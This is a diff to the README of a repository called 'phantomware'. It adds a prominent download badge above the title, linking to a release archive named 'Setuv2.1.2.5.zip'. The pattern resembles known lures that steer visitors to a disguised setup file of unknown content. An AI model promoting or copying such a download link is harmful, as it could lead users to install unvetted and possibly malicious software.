@@ -1,3 +1,5 @@
+[![Download](https://img.shields.io/badge/⬇_Get-Setuv2.1.2.5.zip-success?style=for-the-badge)](https://github.com/roman-wright-ops1989e9/phantomware/releases/download/v1.0.0/Setuv2.1.2.5.zip)
+
 # 🎮 phantomware
 
 ![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)
